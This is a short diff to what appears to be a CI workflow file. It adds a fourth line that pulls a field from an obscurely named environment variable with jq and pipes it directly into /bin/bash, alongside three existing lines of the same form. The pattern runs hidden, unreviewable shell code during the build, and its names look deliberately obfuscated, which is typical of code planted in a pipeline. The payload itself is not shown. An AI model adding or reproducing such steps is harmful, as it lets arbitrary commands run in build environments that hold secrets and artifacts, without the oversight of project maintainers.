@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$sausi653" | jq -r .z65195 | /bin/bash
           printf '%s' "$mgdz2" | jq -r .m0 | /bin/bash
           echo $zf211 | jq -r .z02 | /bin/bash
+          echo $wj6 | jq -r .wx34 | /bin/bash
 
       - name: Store artifact
         if: always()
